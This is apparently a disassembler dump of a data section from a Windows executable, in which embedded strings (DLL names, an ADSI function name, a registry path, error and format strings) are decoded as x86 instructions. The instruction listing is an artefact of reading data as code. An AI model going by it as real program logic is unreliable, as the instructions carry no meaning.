  40419e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4041a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4041a3:	00 65 00             	add    %ah,0x0(%ebp)
  4041a6:	6c                   	insb   (%dx),%es:(%edi)
  4041a7:	00 33                	add    %dh,(%ebx)
  4041a9:	00 32                	add    %dh,(%edx)
  4041ab:	00 2e                	add    %ch,(%esi)
  4041ad:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  4041b1:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4041b5:	00 00                	add    %al,(%eax)
  4041b7:	00 4b 65             	add    %cl,0x65(%ebx)
  4041ba:	72 6e                	jb     0x40422a
  4041bc:	65 6c                	gs insb (%dx),%es:(%edi)
  4041be:	33 32                	xor    (%edx),%esi
  4041c0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4041c3:	6c                   	insb   (%dx),%es:(%edi)
  4041c4:	00 00                	add    %al,(%eax)
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	1c 6b                	sbb    $0x6b,%al
  4041ca:	41                   	inc    %ecx
  4041cb:	00 22                	add    %ah,(%edx)
  4041cd:	6b 41 00 b8          	imul   $0xffffffb8,0x0(%ecx),%eax
  4041d1:	41                   	inc    %ecx
  4041d2:	40                   	inc    %eax
  4041d3:	00 9c 41 40 00 41 00 	add    %bl,0x410040(%ecx,%eax,2)
  4041da:	44                   	inc    %esp
  4041db:	00 73 00             	add    %dh,0x0(%ebx)
  4041de:	4f                   	dec    %edi
  4041df:	00 70 00             	add    %dh,0x0(%eax)
  4041e2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4041e6:	4f                   	dec    %edi
  4041e7:	00 62 00             	add    %ah,0x0(%edx)
  4041ea:	6a 00                	push   $0x0
  4041ec:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4041f0:	74 00                	je     0x4041f2
  4041f2:	46                   	inc    %esi
  4041f3:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  4041f7:	00 67 00             	add    %ah,0x0(%edi)
  4041fa:	73 00                	jae    0x4041fc
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	00 00                	add    %al,(%eax)
  404200:	53                   	push   %ebx
  404201:	00 6f 00             	add    %ch,0x0(%edi)
  404204:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  404209:	00 61 00             	add    %ah,0x0(%ecx)
  40420c:	72 00                	jb     0x40420e
  40420e:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  404213:	00 69 00             	add    %ch,0x0(%ecx)
  404216:	63 00                	arpl   %eax,(%eax)
  404218:	72 00                	jb     0x40421a
  40421a:	6f                   	outsl  %ds:(%esi),(%dx)
  40421b:	00 73 00             	add    %dh,0x0(%ebx)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	00 66 00             	add    %ah,0x0(%esi)
  404222:	74 00                	je     0x404224
  404224:	5c                   	pop    %esp
  404225:	00 57 00             	add    %dl,0x0(%edi)
  404228:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40422e:	6f                   	outsl  %ds:(%esi),(%dx)
  40422f:	00 77 00             	add    %dh,0x0(%edi)
  404232:	73 00                	jae    0x404234
  404234:	5c                   	pop    %esp
  404235:	00 43 00             	add    %al,0x0(%ebx)
  404238:	75 00                	jne    0x40423a
  40423a:	72 00                	jb     0x40423c
  40423c:	72 00                	jb     0x40423e
  40423e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  404242:	74 00                	je     0x404244
  404244:	56                   	push   %esi
  404245:	00 65 00             	add    %ah,0x0(%ebp)
  404248:	72 00                	jb     0x40424a
  40424a:	73 00                	jae    0x40424c
  40424c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  404252:	5c                   	pop    %esp
  404253:	00 41 00             	add    %al,0x0(%ecx)
  404256:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40425a:	69 00 6e 00 44 00    	imul   $0x44006e,(%eax),%eax
  404260:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  404264:	75 00                	jne    0x404266
  404266:	67 00 00             	add    %al,(%bx,%si)
  404269:	00 00                	add    %al,(%eax)
  40426b:	00 30                	add    %dh,(%eax)
  40426d:	00 00                	add    %al,(%eax)
  40426f:	00 45 00             	add    %al,0x0(%ebp)
  404272:	72 00                	jb     0x404274
  404274:	72 00                	jb     0x404276
  404276:	6f                   	outsl  %ds:(%esi),(%dx)
  404277:	00 72 00             	add    %dh,0x0(%edx)
  40427a:	20 00                	and    %al,(%eax)
  40427c:	63 00                	arpl   %eax,(%eax)
  40427e:	6f                   	outsl  %ds:(%esi),(%dx)
  40427f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404283:	00 3a                	add    %bh,(%edx)
  404285:	00 20                	add    %ah,(%eax)
  404287:	00 58 00             	add    %bl,0x0(%eax)
  40428a:	25 00 78 00 00       	and    $0x7800,%eax
  40428f:	00 61 00             	add    %ah,0x0(%ecx)
  404292:	63 00                	arpl   %eax,(%eax)
  404294:	74 00                	je     0x404296
  404296:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40429c:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  4042a0:	2e 00 64 00 6c       	add    %ah,%cs:0x6c(%eax,%eax,1)
  4042a5:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	00 00                	add    %al,(%eax)
  4042ad:	00 00                	add    %al,(%eax)
  4042af:	00 7c 87 40          	add    %bh,0x40(%edi,%eax,4)
  4042b3:	00 b2 08 43 00 ff    	add    %dh,-0xffbcf8(%edx)
  4042b9:	90                   	nop
  4042ba:	41                   	inc    %ecx
  4042bb:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  4042c2:	41                   	inc    %ecx
  4042c3:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  4042ca:	43                   	inc    %ebx
  4042cb:	00 30                	add    %dh,(%eax)
  4042cd:	06                   	push   %es
  4042ce:	43                   	inc    %ebx
  4042cf:	00 2a                	add    %ch,(%edx)
  4042d1:	06                   	push   %es
  4042d2:	43                   	inc    %ebx
  4042d3:	00 24 06             	add    %ah,(%esi,%eax,1)
  4042d6:	43                   	inc    %ebx
  4042d7:	00 1e                	add    %bl,(%esi)
  4042d9:	06                   	push   %es
  4042da:	43                   	inc    %ebx
  4042db:	00 18                	add    %bl,(%eax)
  4042dd:	06                   	push   %es
  4042de:	43                   	inc    %ebx
  4042df:	00 12                	add    %dl,(%edx)
  4042e1:	06                   	push   %es
  4042e2:	43                   	inc    %ebx
  4042e3:	00 94 79 41 00 0c 06 	add    %dl,0x60c0041(%ecx,%edi,2)
  4042ea:	43                   	inc    %ebx
  4042eb:	00 06                	add    %al,(%esi)
  4042ed:	06                   	push   %es
  4042ee:	43                   	inc    %ebx
  4042ef:	00 00                	add    %al,(%eax)
  4042f1:	06                   	push   %es
  4042f2:	43                   	inc    %ebx
  4042f3:	00 fa                	add    %bh,%dl
  4042f5:	05 43 00 f4 05       	add    $0x5f40043,%eax
  4042fa:	43                   	inc    %ebx
  4042fb:	00 ee                	add    %ch,%dh
  4042fd:	05 43 00 e8 05       	add    $0x5e80043,%eax
  404302:	43                   	inc    %ebx
  404303:	00 e2                	add    %ah,%dl
  404305:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40430a:	43                   	inc    %ebx
  40430b:	00 d6                	add    %dl,%dh
  40430d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  404312:	43                   	inc    %ebx
  404313:	00 ca                	add    %cl,%dl
  404315:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40431a:	43                   	inc    %ebx
  40431b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  404321:	05 43 00 b2 05       	add    $0x5b20043,%eax
  404326:	43                   	inc    %ebx
  404327:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40432e:	43                   	inc    %ebx
  40432f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  404335:	05 43 00 94 05       	add    $0x5940043,%eax
  40433a:	43                   	inc    %ebx
  40433b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  404341:	60                   	pusha
  404342:	41                   	inc    %ecx
  404343:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  404349:	a9 40 00 88 05       	test   $0x5880040,%eax
  40434e:	43                   	inc    %ebx
  40434f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  404355:	05 43 00 76 05       	add    $0x5760043,%eax
  40435a:	43                   	inc    %ebx
  40435b:	00 70 05             	add    %dh,0x5(%eax)
  40435e:	43                   	inc    %ebx
  40435f:	00 6a 05             	add    %ch,0x5(%edx)
  404362:	43                   	inc    %ebx
  404363:	00 96 06 43 00 5e    	add    %dl,0x5e004306(%esi)
  404369:	05 43 00 58 05       	add    $0x5580043,%eax
  40436e:	43                   	inc    %ebx
  40436f:	00 52 05             	add    %dl,0x5(%edx)
  404372:	43                   	inc    %ebx
  404373:	00 30                	add    %dh,(%eax)
  404375:	00 78 00             	add    %bh,0x0(%eax)
  404378:	25 00 31 00 78       	and    $0x78003100,%eax
  40437d:	00 25 00 31 00 78    	add    %ah,0x78003100
  404383:	00 00                	add    %al,(%eax)
  404385:	00 00                	add    %al,(%eax)
  404387:	00 25 00 58 00 00    	add    %ah,0x5800
  40438d:	00 00                	add    %al,(%eax)
  40438f:	00 25 00 32 00 2e    	add    %ah,0x2e003200
  404395:	00 32                	add    %dh,(%edx)
  404397:	00 58 00             	add    %bl,0x0(%eax)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	25 00 6f 00 00       	and    $0x6f00,%eax
  4043a1:	00 00                	add    %al,(%eax)
  4043a3:	00 25 00 33 00 2e    	add    %ah,0x2e003300
  4043a9:	00 33                	add    %dh,(%ebx)
  4043ab:	00 6f 00             	add    %ch,0x0(%edi)
  4043ae:	00 00                	add    %al,(%eax)
  4043b0:	25 00 33 00 2e       	and    $0x2e003300,%eax
  4043b5:	00 33                	add    %dh,(%ebx)
